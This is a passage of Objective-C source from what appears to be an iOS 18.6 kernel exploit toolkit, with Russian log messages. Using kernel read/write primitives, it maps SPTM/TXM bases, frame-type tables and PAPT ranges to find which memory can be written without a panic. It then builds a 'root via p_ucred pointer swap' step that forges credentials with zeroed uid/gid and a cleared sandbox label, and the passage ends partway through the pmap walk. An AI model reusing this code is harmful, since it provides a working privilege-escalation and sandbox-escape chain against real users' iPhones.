        }];
        NSNumber *best = sorted.firstObject;
        kpNote(r, [NSString stringWithFormat:@"  vote TXM: slide=%s0x%llx голосов=%d (слабо)",
                  best.longLongValue < 0 ? "-" : "", (unsigned long long)llabs(best.longLongValue), txmVotes[best].intValue]);
        int64_t slide = best.longLongValue;
        gSystemInfo.kernelConstant.txmSlide = (uint64_t)slide;
        gSystemInfo.kernelConstant.txmBase = kconstant(staticTxmBase) + slide;
        kpNote(r, [NSString stringWithFormat:@"  EXP-02: txmSlide=%s0x%llx, txmBase=0x%016llx",
                  slide < 0 ? "-" : "", (unsigned long long)llabs(slide), (unsigned long long)kconstant(txmBase)]);
        okTxm = YES;
    }
    if (!okSptm) kpNote(r, @"  EXP-02: SPTM-слайд не вычислен (нет голосов) — sptmBase/slide остаются 0");
    if (!okTxm) kpNote(r, @"  EXP-02: TXM-слайд не вычислен (нет голосов) — txmBase/slide остаются 0");
    return okSptm || okTxm;
}

+ (BOOL)harvestSptmTxmBasesWithLog:(NSMutableString *)r
{
    if (kconstant(sptmBase) && kconstant(txmBase)) {
        return YES; // already harvested
    }
    uint64_t sym = ksymbol(SPTMArgs);
    if (!sym) {
        kpNote(r, @"  SPTMArgs: ключ не найден — harvest невозможен");
        return NO;
    }

    // Fast path: DEBG scan of the 16 SPTMArgs pointees. Field result on 18.6:
    // all point at SPTM-call stub pages (bti c), no DEBG — kept anyway.
    uint8_t argsBuf[128];
    memset(argsBuf, 0, sizeof(argsBuf));
    if (kpRead(sym, argsBuf, sizeof(argsBuf), "SPTMArgs", r)) {
        BOOL debgFound = NO;
        for (int i = 0; i < 16; i++) {
            uint64_t raw = 0;
            memcpy(&raw, argsBuf + i * 8, sizeof(raw));
            if (!raw) continue;
            uint64_t ptr = kp_untag_ptr(raw);
            if (!kpLooksLikeKernelPointer(ptr)) continue;
            uint8_t page[0x100];
            memset(page, 0, sizeof(page));
            if (!kpRead(ptr, page, sizeof(page), "SPTMArgs pointee", r)) continue;
            uint32_t magic = 0;
            memcpy(&magic, page, sizeof(magic));
            if (magic != 0x47424544) continue; // 'DEBG'
            uint64_t sptmB = 0, txmB = 0;
            memcpy(&sptmB, page + 0x10, sizeof(sptmB));
            memcpy(&txmB, page + 0x20, sizeof(txmB));
            kpNote(r, [NSString stringWithFormat:@"  EXP-02: DEBG найден: SPTMArgs[%d] → %#llx; sptm base=0x%016llx txm base=0x%016llx",
                      i, ptr, (unsigned long long)sptmB, (unsigned long long)txmB]);
            if (kpLooksLikeKernelPointer(sptmB) && kconstant(staticSptmBase)) {
                gSystemInfo.kernelConstant.sptmBase = sptmB;
                gSystemInfo.kernelConstant.sptmSlide = sptmB - kconstant(staticSptmBase);
            }
            if (kpLooksLikeKernelPointer(txmB) && kconstant(staticTxmBase)) {
                gSystemInfo.kernelConstant.txmBase = txmB;
                gSystemInfo.kernelConstant.txmSlide = txmB - kconstant(staticTxmBase);
            }
            debgFound = YES;
            break;
        }
        if (debgFound) return YES;
        kpNote(r, @"  EXP-02: DEBG не найден (16 pointees — стабы), перехожу к pointer-vote");
    }

    // 1.8.3: the pointer-vote walk is DEAD. It read hundreds of pointees from
    // the libsptm block, and some resolve (kvtophys != 0) but panic the EL1
    // read anyway — SPTM-owned pages (the 20:58 post-win panic, 19s after a
    // clean win). The vote is unnecessary: every panic header this device has
    // produced shows a fixed layout — SPTM = kernel base - 0x20000000, TXM =
    // kernel base - 0x10000000. Hardcode it; zero reads.
    if (kconstant(base) && kconstant(staticSptmBase)) {
        uint64_t sptmB = kconstant(base) - 0x20000000ULL;
        gSystemInfo.kernelConstant.sptmBase = sptmB;
        gSystemInfo.kernelConstant.sptmSlide = sptmB - kconstant(staticSptmBase);
        kpNote(r, [NSString stringWithFormat:@"  EXP-02 (формула, без голосования): sptmBase=0x%016llx sptmSlide=0x%llx",
                  (unsigned long long)sptmB, (unsigned long long)gSystemInfo.kernelConstant.sptmSlide]);
    }
    if (kconstant(base) && kconstant(staticTxmBase)) {
        uint64_t txmB = kconstant(base) - 0x10000000ULL;
        gSystemInfo.kernelConstant.txmBase = txmB;
        gSystemInfo.kernelConstant.txmSlide = txmB - kconstant(staticTxmBase);
        kpNote(r, [NSString stringWithFormat:@"  EXP-02 (формула): txmBase=0x%016llx txmSlide=0x%llx",
                  (unsigned long long)txmB, (unsigned long long)gSystemInfo.kernelConstant.txmSlide]);
    }
    return (kconstant(staticSptmBase) && gSystemInfo.kernelConstant.sptmBase) ||
           (kconstant(staticTxmBase) && gSystemInfo.kernelConstant.txmBase);
}

#pragma mark - EXP-03: frame-table / descriptor / PAPT survey

static uint64_t gFrameTableVA = 0;
static BOOL gHeapTypeKnown = NO;
static uint8_t gHeapFrameType = 0;

// Managed-DRAM predicate on this device: physBase is 0x1_00xxxxxx (T8122),
// so the old ">16 GiB" clamp rejected EVERY real PA. Frame type is only
// meaningful inside [physBase, physBase+physSize).
static BOOL kpPAIsManaged(uint64_t pa)
{
    return kconstant(physBase) && pa >= kconstant(physBase) &&
           pa < kconstant(physBase) + kconstant(physSize);
}

+ (uint64_t)frameTableVAWithLog:(NSMutableString *)r
{
    if (gFrameTableVA) return gFrameTableVA;
    if (!ksymbol(libsptm_frame_table)) {
        kpNote(r, @"  libsptm_frame_table: ключ не найден — пропуск");
        return 0;
    }
    uint64_t raw = 0;
    if (!kpRead(ksymbol(libsptm_frame_table), &raw, sizeof(raw), "libsptm_frame_table slot", r)) return 0;
    uint64_t va = kp_untag_ptr(raw);
    kpNote(r, [NSString stringWithFormat:@"  frame table: raw=0x%016llx → VA 0x%016llx",
              (unsigned long long)raw, (unsigned long long)va]);
    if (!kpLooksLikeKernelPointer(va)) {
        kpNote(r, @"  frame table VA неправдоподобен — пропуск");
        return 0;
    }
    gFrameTableVA = va;
    return va;
}

// Frame-type byte for a physical address: fte = table + (pa>>14)*16, type at
// byte +2 (spec §6.1). -1 when unavailable / implausible. Silent variant for
// sweeps (the table page is proven EL1-readable before any sweep starts).
static int kpFrameTypeOfPALogged(uint64_t tableVA, uint64_t pa, NSMutableString *r)
{
    if (!tableVA || pa == 0 || !kpPAIsManaged(pa)) return -1;
    // 1.9.10: index by (pa - physBase)>>14, NOT pa>>14 — absolute-pfn indexing
    // overshoots the (physSize/16K)-entry table on this 4GB+ device and read
    // garbage (the "level=112" FTE). The alt-index probe read back a sane
    // leaf FTE (type 0x14, level 3).
    if (kconstant(physBase) && pa < kconstant(physBase)) return -1;
    uint64_t fte = tableVA + ((pa - kconstant(physBase)) >> 14) * 16;
    uint8_t entry[16];
    memset(entry, 0, sizeof(entry));
    if (!kpRead(fte, entry, sizeof(entry), "frame-table entry", r)) return -1;
    return entry[2];
}

static int kpFrameTypeOfPAQuiet(uint64_t tableVA, uint64_t pa)
{
    if (!tableVA || pa == 0 || !kpPAIsManaged(pa)) return -1;
    if (kconstant(physBase) && pa < kconstant(physBase)) return -1;
    uint64_t fte = tableVA + ((pa - kconstant(physBase)) >> 14) * 16;
    uint8_t entry[16];
    memset(entry, 0, sizeof(entry));
    kreadbuf(fte, entry, sizeof(entry));
    return entry[2];
}

// §6.3: compressed PAPT range = 24 B {paddr_start, va_base, page_count, pad}.
static BOOL kpPaptEntryPlausible(const uint8_t *e)
{
    uint64_t paddr = 0, vabase = 0;
    uint32_t count = 0;
    memcpy(&paddr, e, 8);
    memcpy(&vabase, e + 8, 8);
    memcpy(&count, e + 16, 4);
    if (!paddr || (paddr & 0x3FFF)) return NO;       // page-aligned DRAM PA
    if (!kpPAIsManaged(paddr)) return NO;
    if (count == 0 || count > 0x80000) return NO;    // sane page count
    if (vabase && !kpLooksLikeKernelPointer(vabase)) return NO;
    return YES;
}

static NSString *kpFmtSptmFn(uint64_t raw)
{
    uint64_t va = kp_untag_ptr(raw);
    if (!va) return @"-";
    if (kconstant(sptmBase) && va >= kconstant(sptmBase) && va < kconstant(sptmBase) + 0x100000) {
        return [NSString stringWithFormat:@"sptm+%#llx", (unsigned long long)(va - kconstant(sptmBase))];
    }
    return [NSString stringWithFormat:@"0x%016llx", (unsigned long long)va];
}

+ (NSString *)sptmSurveyReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== EXP-01..03: обзор SPTM (read-only) ===\n"];
    if (!gPrimitives.kreadbuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }

    // ---------- EXP-01: allproc fix (multi-route) ----------
    [r appendString:@"\n--- EXP-01: allproc (кандидаты + калибровка по kernel_task) ---\n"];
    uint64_t head = [self resolveAllprocHeadWithLog:r];
    if (head) {
        uint64_t node = head, prev = 0;
        for (int i = 0; i < 4 && kpLooksLikeKernelPointer(node) && node != prev; i++) {
            kpDumpProc(r, "allproc", node, gCommOff);
            uint64_t nextRaw = 0;
            if (!kpRead(node + koffsetof(proc, list_next), &nextRaw, sizeof(nextRaw), "le_next", r)) break;
            prev = node;
            node = kp_untag_ptr(nextRaw);
        }
    }

    // ---------- EXP-02: bases via DEBG + pointer-vote ----------
    [r appendString:@"\n--- EXP-02: SPTM/TXM базы (DEBG + голосование) ---\n"];
    [self harvestSptmTxmBasesWithLog:r];
    kpNote(r, [NSString stringWithFormat:@"  итог: sptmBase=0x%016llx slide=0x%llx | txmBase=0x%016llx slide=0x%llx",
              (unsigned long long)kconstant(sptmBase), (unsigned long long)kconstant(sptmSlide),
              (unsigned long long)kconstant(txmBase), (unsigned long long)kconstant(txmSlide)]);

    // ---------- EXP-03: frame survey ----------
    [r appendString:@"\n--- EXP-03: frame table + дескрипторы + PAPT ---\n"];
    uint64_t tableVA = [self frameTableVAWithLog:r];

    uint64_t paramsVA = 0;
    if (ksymbol(libsptm_frame_type_params)) {
        uint64_t raw = 0;
        if (kpRead(ksymbol(libsptm_frame_type_params), &raw, sizeof(raw), "libsptm_frame_type_params slot", r)) {
            paramsVA = kp_untag_ptr(raw);
            kpNote(r, [NSString stringWithFormat:@"  frame_type_params: raw=0x%016llx → VA 0x%016llx",
                      (unsigned long long)raw, (unsigned long long)paramsVA]);
        }
    }

    // Descriptor table: read the direct pointee first. If it reads as code
    // stubs (few SPTM-image pointers), content-scan the libsptm block pointee
    // pages for the page with the densest SPTM-image pointers — that's the
    // real descriptor copy.
    size_t descCount = 63, descSize = 0x60;
    uint64_t descVA = 0;
    uint8_t *desc = malloc(descCount * descSize);
    memset(desc, 0, descCount * descSize);
    if (paramsVA && kpLooksLikeKernelPointer(paramsVA)) {
        if (kpRead(paramsVA, desc, descCount * descSize, "frame-type descriptors", r)) {
            descVA = paramsVA;
        }
    }
    if (descVA) {
        // stub detection: count hooks stripping into the SPTM image
        int sptmHits = 0;
        if (kconstant(staticSptmBase)) {
            uint64_t lo = kconstant(staticSptmBase), hi = lo + 0xF4000;
            for (size_t i = 0; i < descCount; i++) {
                const uint8_t *d = desc + i * descSize;
                for (int f = 0; f < 4; f++) {
                    static const int offs[4] = { 0x00, 0x08, 0x20, 0x30 };
                    uint64_t raw = 0;
                    memcpy(&raw, d + offs[f], 8);
                    uint64_t va = kp_untag_ptr(raw);
                    if (va >= lo && va < hi) sptmHits++;
                }
            }
        }
        if (sptmHits < 8) {
            kpNote(r, [NSString stringWithFormat:@"  pointee дескрипторов читается как СТАБЫ/код (SPTM-хуков %d) — это function table, не данные; ищем data-страницу по контенту", sptmHits]);
            descVA = 0;
            // content-scan pointee pages
            NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:nil];
            uint64_t bestVA = 0;
            int bestHits = 0;
            for (NSNumber *pv in pointees) {
                uint64_t pageVA = pv.unsignedLongLongValue;
                uint8_t *pageBuf = malloc(0x4000);
                memset(pageBuf, 0, 0x4000);
                BOOL ok = YES;
                for (uint64_t off = 0; ok && off < 0x4000; off += 0x400) {
                    ok = kpRead(pageVA + off, pageBuf + off, 0x400, "desc scan", nil);
                }
                if (ok && kconstant(staticSptmBase)) {
                    uint64_t lo = kconstant(staticSptmBase), hi = lo + 0xF4000;
                    int hits = 0;
                    for (uint32_t q = 0; q + 8 <= 0x4000; q += 8) {
                        uint64_t raw = 0;
                        memcpy(&raw, pageBuf + q, 8);
                        uint64_t va = kp_untag_ptr(raw);
                        if (va >= lo && va < hi) hits++;
                    }
                    if (hits > bestHits) { bestHits = hits; bestVA = pageVA; }
                }
                free(pageBuf);
            }
            if (bestVA) {
                kpNote(r, [NSString stringWithFormat:@"  дескрипторная data-страница: 0x%016llx (SPTM-указателей: %d)", bestVA, bestHits]);
                memset(desc, 0, descCount * descSize);
                if (kpRead(bestVA, desc, descCount * descSize, "descriptor data page", r)) {
                    descVA = bestVA;
                }
            }
            else {
                kpNote(r, @"  дескрипторная таблица не найдена среди pointee-страниц");
            }
        }
    }

    if (descVA) {
        kpNote(r, [NSString stringWithFormat:@"  дескрипторы @ 0x%016llx (63 × 0x60):", descVA]);
        [r appendString:@"   [idx] cls=b0/b1/b2 @+0x18, маски @+0x28/@+0x38, хуки @+0x00/+0x08/+0x20/+0x30 (sptm+off при известном слайде)\n"];
        for (size_t i = 0; i < descCount; i++) {
            const uint8_t *d = desc + i * descSize;
            uint64_t fn0 = 0, fn1 = 0, fn2 = 0, fn3 = 0, m28 = 0, m38 = 0;
            memcpy(&fn0, d + 0x00, 8);
            memcpy(&fn1, d + 0x08, 8);
            memcpy(&m28, d + 0x28, 8);
            memcpy(&fn2, d + 0x20, 8);
            memcpy(&fn3, d + 0x30, 8);
            memcpy(&m38, d + 0x38, 8);
            [r appendFormat:@"   [%02zu] cls=%02x/%02x/%02x m28=0x%010llx m38=0x%010llx | %@ %@ %@ %@\n",
                i, d[0x18], d[0x19], d[0x1a],
                (unsigned long long)m28, (unsigned long long)m38,
                kpFmtSptmFn(fn0), kpFmtSptmFn(fn1), kpFmtSptmFn(fn2), kpFmtSptmFn(fn3)];
        }
    }
    free(desc);

    // PAPT hunt: content-validate block pointees. 24-B format (spec §6.3)
    // first; then the 16-B fast-path format (§5.3, entries at +8, stride 16),
    // +0x68 slot (state +112) first for the 16-B try.
    uint64_t paptVA = 0;
    uint64_t paptN = 0;
    uint32_t paptFmt = 0;
    NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:nil];
    // 24-B hunt
    for (NSNumber *pv in pointees) {
        uint64_t cand = pv.unsignedLongLongValue;
        uint8_t first2[48];
        memset(first2, 0, sizeof(first2));
        if (!kpRead(cand, first2, sizeof(first2), "papt candidate 24B", r)) continue;
        if (kpPaptEntryPlausible(first2) && kpPaptEntryPlausible(first2 + 24)) {
            paptVA = cand;
            paptFmt = 0;
            kpNote(r, [NSString stringWithFormat:@"  PAPT (24-B): найдена @ 0x%016llx", cand]);
            break;
        }
    }
    // 16-B hunt (+0x68 slot = state +112 first, per §5.2)
    if (!paptVA && pointees.count) {
        NSMutableArray<NSNumber *> *order = [NSMutableArray array];
        // the +0x68 slot's pointee is pointees[13] (index 0x68/8); try it first
        if (pointees.count > 13) [order addObject:pointees[13]];
        for (NSNumber *pv in pointees) {
            if (![order containsObject:pv]) [order addObject:pv];
        }
        for (NSNumber *pv in order) {
            uint64_t cand = pv.unsignedLongLongValue;
            uint8_t first3[64];
            memset(first3, 0, sizeof(first3));
            if (!kpRead(cand, first3, sizeof(first3), "papt candidate 16B", r)) continue;
            // entries at +8, stride 16: {va_base, start_pfn:u32@8, count:u24@12}
            BOOL ok = YES;
            for (int e = 0; e < 2; e++) {
                uint32_t pfn = 0, cntRaw = 0;
                memcpy(&pfn, first3 + 8 + e * 16, 4);
                memcpy(&cntRaw, first3 + 8 + e * 16 + 8, 4);
                uint64_t pa = (uint64_t)pfn * 0x4000;
                uint32_t cnt = cntRaw & 0xFFFFFF;
                if (!kpPAIsManaged(pa) || cnt == 0 || cnt > 0x100000) { ok = NO; break; }
            }
            if (ok) {
                paptVA = cand;
                paptFmt = 1;
                kpNote(r, [NSString stringWithFormat:@"  PAPT (16-B fast-path): найдена @ 0x%016llx", cand]);
                break;
            }
        }
    }

    if (paptVA) {
        // count ranges: u32 at symbol, else pointer-chase, else walk
        uint32_t n = 0;
        if (ksymbol(libsptm_n_papt_ranges)) {
            kpRead(ksymbol(libsptm_n_papt_ranges), &n, sizeof(n), "libsptm_n_papt_ranges", r);
            if (n == 0 || n > 64) {
                uint64_t nptr = 0;
                if (kpRead(ksymbol(libsptm_n_papt_ranges), &nptr, sizeof(nptr), "n_papt_ranges ptr", r)) {
                    nptr = kp_untag_ptr(nptr);
                    if (kpLooksLikeKernelPointer(nptr)) kpRead(nptr, &n, sizeof(n), "n_papt_ranges chase", r);
                }
            }
        }
        if (n == 0 || n > 64) {
            // walk until the signature breaks
            n = 0;
            while (n < 64) {
                uint8_t ent[24];
                memset(ent, 0, sizeof(ent));
                uint64_t eVA = paptFmt == 1 ? paptVA + 8 + n * 16 : paptVA + n * 24;
                if (!kpRead(eVA, ent, sizeof(ent), "papt walk", r)) break;
                if (paptFmt == 1) {
                    uint32_t pfn = 0, cntRaw = 0;
                    memcpy(&pfn, ent, 4);
                    memcpy(&cntRaw, ent + 8, 4);
                    uint64_t pa = (uint64_t)pfn * 0x4000;
                    uint32_t cnt = cntRaw & 0xFFFFFF;
                    if (!kpPAIsManaged(pa) || cnt == 0 || cnt > 0x100000) break;
                }
                else {
                    if (!kpPaptEntryPlausible(ent)) break;
                }
                n++;
            }
        }
        paptN = n;
        kpNote(r, [NSString stringWithFormat:@"  PAPT: table=0x%016llx n=%llu fmt=%s", paptVA, (unsigned long long)paptN, paptFmt ? "16-B" : "24-B"]);

        for (uint64_t i = 0; i < paptN && i < 32; i++) {
            uint8_t ent[24];
            memset(ent, 0, sizeof(ent));
            uint64_t eVA = paptFmt == 1 ? paptVA + 8 + i * 16 : paptVA + i * 24;
            if (!kpRead(eVA, ent, sizeof(ent), "papt entry", r)) break;
            uint64_t paddr = 0, vabase = 0;
            uint32_t count = 0;
            if (paptFmt == 1) {
                memcpy(&vabase, ent, 8);
                uint32_t pfn = 0, cntRaw = 0;
                memcpy(&pfn, ent + 8, 4);
                memcpy(&cntRaw, ent + 12, 4);
                paddr = (uint64_t)pfn * 0x4000;
                count = cntRaw & 0xFFFFFF;
            }
            else {
                memcpy(&paddr, ent, 8);
                memcpy(&vabase, ent + 8, 8);
                memcpy(&count, ent + 16, 4);
            }
            [r appendFormat:@"    papt[%02llu] pa=0x%010llx va=0x%016llx pages=%u (pa …+0x%llx)\n",
                (unsigned long long)i, (unsigned long long)paddr,
                (unsigned long long)vabase, count,
                (unsigned long long)count * 0x4000];
        }

        kp_papt_table_va = paptVA;
        kp_papt_table_n = paptN;
        kp_papt_format = paptFmt;
    }
    else {
        kpNote(r, @"  PAPT-таблица не найдена среди pointees (24-B и 16-B) — kvtophys недоступен");
    }

    // Translation self-check: VA-mode (cpu_ttep stripped as VA) vs PA-mode
    // (TTBR phys). Accept whichever yields a plausible PA for the kernel base.
    BOOL translOK = NO;
    if (kp_papt_table_va) {
        uint64_t basePA = 0;
        const char *mode = "нет";
        if (gCpuTtepVA && kpLooksLikeKernelPointer(gCpuTtepVA)) {
            gSystemInfo.kernelConstant.cpuTTEP = gCpuTtepVA;
            errno = 0;
            uint64_t pa = kvtophys(kconstant(base));
            kpNote(r, [NSString stringWithFormat:@"  kvtophys VA-режим: base → PA=0x%010llx (errno=%d)", (unsigned long long)pa, errno]);
            if (pa && kpPAIsManaged(pa)) { basePA = pa; mode = "VA"; }
        }
        if (!basePA && kconstant(cpuTTEP)) {
            gSystemInfo.kernelConstant.cpuTTEP = gCpuTtepPhys;
            errno = 0;
            uint64_t pa = kvtophys(kconstant(base));
            kpNote(r, [NSString stringWithFormat:@"  kvtophys PA-режим (TTBR): base → PA=0x%010llx (errno=%d)", (unsigned long long)pa, errno]);
            if (pa && kpPAIsManaged(pa)) { basePA = pa; mode = "PA(TTBR)"; }
        }
        if (basePA) {
            translOK = YES;
            kpNote(r, [NSString stringWithFormat:@"  kvtophys работает: режим=%s, kernel base PA=0x%010llx", mode, (unsigned long long)basePA]);
        }
        else {
            kpNote(r, @"  kvtophys не работает ни в одном режиме — калибровка типов пропущена");
        }
    }

    // Frame-type calibration on known-role anchors, then a sampled sweep.
    if (tableVA && translOK) {
        [r appendString:@"\n  Калибровка типов фреймов (kvtophys + fte[2]):\n"];
        struct { const char *role; uint64_t va; } anchors[4];
        int na = 0;
        anchors[na].role = "kernel text (base)"; anchors[na].va = kconstant(base); na++;
        if (gCpuTtepVA && kpLooksLikeKernelPointer(gCpuTtepVA)) {
            anchors[na].role = "корень TT (cpu_ttep VA)"; anchors[na].va = gCpuTtepVA; na++;
        }
        anchors[na].role = "frame table (сама)"; anchors[na].va = tableVA; na++;
        uint64_t selfProc = [self findSelfProcByComm:r];
        if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
        if (selfProc) {
            anchors[na].role = "наш proc (heap)"; anchors[na].va = selfProc; na++;
        }
        for (int i = 0; i < na; i++) {
            errno = 0;
            uint64_t pa = kvtophys(anchors[i].va);
            int type = (pa != 0) ? kpFrameTypeOfPALogged(tableVA, pa, r) : -1;
            kpNote(r, [NSString stringWithFormat:@"    %-24s VA=0x%016llx PA=0x%010llx type=%@",
                      anchors[i].role, (unsigned long long)anchors[i].va,
                      (unsigned long long)pa,
                      type < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", type]]);
            if (selfProc && anchors[i].va == selfProc && type >= 0) {
                gHeapFrameType = (uint8_t)type;
                gHeapTypeKnown = YES;
            }
        }

        if (paptVA && paptN) {
            [r appendString:@"\n  Развёртка типов по PAPT-диапазонам (выборка ≤16 страниц на диапазон):\n"];
            NSMutableDictionary<NSNumber *, NSNumber *> *hist = [NSMutableDictionary dictionary];
            uint64_t sampled = 0;
            for (uint64_t i = 0; i < paptN && i < 32; i++) {
                uint8_t ent[24];
                memset(ent, 0, sizeof(ent));
                uint64_t eVA = paptFmt == 1 ? paptVA + 8 + i * 16 : paptVA + i * 24;
                if (!kpRead(eVA, ent, sizeof(ent), "papt entry", r)) break;
                uint64_t paddr = 0;
                uint32_t count = 0;
                if (paptFmt == 1) {
                    uint32_t pfn = 0, cntRaw = 0;
                    memcpy(&pfn, ent, 4);
                    memcpy(&cntRaw, ent + 8, 4);
                    paddr = (uint64_t)pfn * 0x4000;
                    count = cntRaw & 0xFFFFFF;
                }
                else {
                    memcpy(&paddr, ent, 8);
                    memcpy(&count, ent + 16, 4);
                }
                uint32_t step = count / 16 ? count / 16 : 1;
                for (uint32_t pg = 0; pg < count && pg / step < 16; pg += step) {
                    int t = kpFrameTypeOfPAQuiet(tableVA, paddr + (uint64_t)pg * 0x4000);
                    if (t < 0) continue;
                    NSNumber *key = @(t & 0xff);
                    hist[key] = @(hist[key].unsignedIntValue + 1);
                    sampled++;
                }
            }
            NSArray<NSNumber *> *types = [hist.allKeys sortedArrayUsingSelector:@selector(compare:)];
            for (NSNumber *t in types) {
                [r appendFormat:@"    type 0x%02x: %u страниц%s\n",
                    t.unsignedIntValue, hist[t].unsignedIntValue,
                    (gHeapTypeKnown && t.unsignedIntValue == gHeapFrameType) ? "  ← XNU_DEFAULT (heap, writable)" : ""];
            }
            kpNote(r, [NSString stringWithFormat:@"  всего отсемплировано: %llu страниц", (unsigned long long)sampled]);
        }
    }
    else if (tableVA) {
        kpNote(r, @"  калибровка типов: пропущена (нет рабочей трансляции)");
    }

    if (gHeapTypeKnown) {
        [r appendFormat:@"\n  ПРЕДИКАТ ЗАПИСИ: type == 0x%02x (калибровано по нашему proc) ⇔ kwrite без паники; всё остальное — фолт в physical aperture\n",
            gHeapFrameType];
    }
    else {
        [r appendString:@"\n  ПРЕДИКАТ ЗАПИСИ: не калиброван (нет PAPT/kvtophys) — запись только после ручной проверки\n"];
    }
    [r appendString:@"\n=== EXP-01..03 завершены (read-only, паники быть не должно) ===\n"];
    return r;
}

#pragma mark - EXP-09: ucred pointer-swap root (heap-only)

+ (NSString *)ucredHeapSwapReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== EXP-09: root через подмену указателя p_ucred (heap-only) ===\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }

    // 1. Own proc. 1.9.0: proc_self() direct (offsets chain, no allproc walk —
    //    the walk was the panic source). comm/pid routes stay as fallback.
    pid_t selfPid = getpid();
    kpNote(r, [NSString stringWithFormat:@"  наш pid: %d", selfPid]);
    uint64_t selfProc = proc_self();
    kpNote(r, [NSString stringWithFormat:@"  наш proc (proc_self): 0x%016llx", (unsigned long long)selfProc]);
    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
    if (!selfProc) selfProc = [self findSelfProcByComm:r];
    if (!selfProc) selfProc = [self findProcByPid:(uint32_t)selfPid log:r];
    if (!selfProc) {
        [r appendString:@"FAIL: свой proc не найден\n"];
        return r;
    }
    if (gCommOff) {
        uint8_t full[0x400];
        memset(full, 0, sizeof(full));
        if (kpRead(selfProc, full, sizeof(full), "self proc", r)) {
            char comm[33] = {0};
            memcpy(comm, full + gCommOff, 32);
            kpNote(r, [NSString stringWithFormat:@"  comm нашего proc: \"%s\" (ждём KexProof)", comm]);
        }
    }

    // 2. Locate the ucred pointer field. The 18.6 ladder: proc.ucred is a
    //    tombstone (moved at 15.2); the live one is proc_ro->ucred at
    //    *(proc+0x18) + 0x28. The spec's 0xD8 slot is logged for comparison.
    uint64_t legacyRaw = 0;
    kpRead(selfProc + 0xD8, &legacyRaw, sizeof(legacyRaw), "proc+0xD8 (legacy ucred)", r);
    kpNote(r, [NSString stringWithFormat:@"  proc+0xD8 = 0x%016llx (мёртвое поле на 15.2+; ucred уехал в proc_ro)",
              (unsigned long long)legacyRaw]);

    uint64_t procRoRaw = 0;
    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &procRoRaw, sizeof(procRoRaw), "proc.proc_ro", r)) {
        [r appendString:@"FAIL: proc.proc_ro не прочитан\n"];
        return r;
    }
    uint64_t procRo = kp_untag_ptr(procRoRaw);
    kpNote(r, [NSString stringWithFormat:@"  proc_ro: raw=0x%016llx → 0x%016llx",
              (unsigned long long)procRoRaw, (unsigned long long)procRo]);
    if (!kpLooksLikeKernelPointer(procRo)) {
        [r appendString:@"FAIL: proc_ro не kernel-указатель\n"];
        return r;
    }

    uint64_t ucredSlot = procRo + koffsetof(proc_ro, ucred);
    uint64_t curUcredRaw = 0;
    if (!kpRead(ucredSlot, &curUcredRaw, sizeof(curUcredRaw), "proc_ro.ucred", r)) {
        [r appendString:@"FAIL: proc_ro.ucred не прочитан\n"];
        return r;
    }
    uint64_t curUcred = kp_untag_ptr(curUcredRaw);
    kpNote(r, [NSString stringWithFormat:@"  proc_ro.ucred @ %#llx: raw=0x%016llx → 0x%016llx",
              (unsigned long long)ucredSlot, (unsigned long long)curUcredRaw, (unsigned long long)curUcred]);
    if (!kpLooksLikeKernelPointer(curUcred)) {
        [r appendString:@"FAIL: ucred не kernel-указатель\n"];
        return r;
    }

    // Validate the field: cr_uid (+0x18) must equal getuid().
    uint8_t realCred[0x120];
    memset(realCred, 0, sizeof(realCred));
    if (!kpRead(curUcred, realCred, sizeof(realCred), "current ucred", r)) {
        [r appendString:@"FAIL: текущий ucred не читается\n"];
        return r;
    }
    uint32_t curUid = 0, curGid = 0;
    memcpy(&curUid, realCred + 0x18, sizeof(curUid));
    memcpy(&curGid, realCred + 0x28, sizeof(curGid));
    kpNote(r, [NSString stringWithFormat:@"  текущий ucred: uid=%u gid=%u (getuid()=%d getgid()=%d)",
              curUid, curGid, getuid(), getgid()]);
    if (curUid != (uint32_t)getuid()) {
        [r appendString:@"FAIL: cr_uid не совпал с getuid() — поле не подтверждено, запись отменена\n"];
        return r;
    }

    // 1.9.3: pointer swap via a forge in OUR OWN wired user page, which the
    // kernel reads through the physmap. The 1.9.2 in-place patch proved ucred
    // is read-only cred memory on 18.6 (setsockopt refuses, nothing lands).
    // proc_ro is RW. Chain to our page's kernel VA:
    //   proc -> proc_ro -> task -> vm_map -> pmap -> ttep, then
    //   vtophys(ourPmapTtep, page) gives the page's PA, and the physmap is
    //   linear: kernelVA = virtBase + (pa - physBase).
    {
        // forged ucred: copy of the validated real one, uid/gid zeroed, MAC
        // label cleared (sandbox off), refcount bumped so it never frees.
        uint8_t forge[0x120];
        memcpy(forge, realCred, sizeof(forge));
        memset(forge + 0x18, 0, 12);  // cr_uid / cr_ruid / cr_svuid = 0
        memset(forge + 0x28, 0, 4);   // cr_groups[0] (primary gid) = 0
        memset(forge + 0x68, 0, 8);   // cr_rgid / cr_svgid = 0
        memset(forge + 0x78, 0, 8);   // cr_label = NULL — sandbox label off
        uint32_t ref = 0;
        memcpy(&ref, realCred + 0x10, sizeof(ref));
        ref += 0x1000;
        memcpy(forge + 0x10, &ref, sizeof(ref));

        // a wired page we own, holding the forge
        uint8_t *page = NULL;
        if (posix_memalign((void **)&page, 0x4000, 0x4000) != 0 || !page) {
            [r appendString:@"FAIL: posix_memalign\n"];
            return r;
        }
        memset(page, 0, 0x4000);
        memcpy(page, forge, sizeof(forge));
        if (mlock(page, 0x4000) != 0) {
            kpNote(r, [NSString stringWithFormat:@"  mlock: %s — продолжаю (страница свежая, не выгрузится сразу)", strerror(errno)]);
        }

        // proc_ro -> task -> map -> pmap -> ttep
        uint64_t task = 0, map = 0, pmap = 0, ttep = 0;
        if (!kpRead(procRo + off_proc_ro_pr_task, &task, sizeof(task), "proc_ro.pr_task", r)) return r;
        task = kp_untag_ptr(task);
        if (!kpLooksLikeKernelPointer(task)) { [r appendString:@"FAIL: task\n"]; return r; }
        if (!kpRead(task + off_task_map, &map, sizeof(map), "task.map", r)) return r;
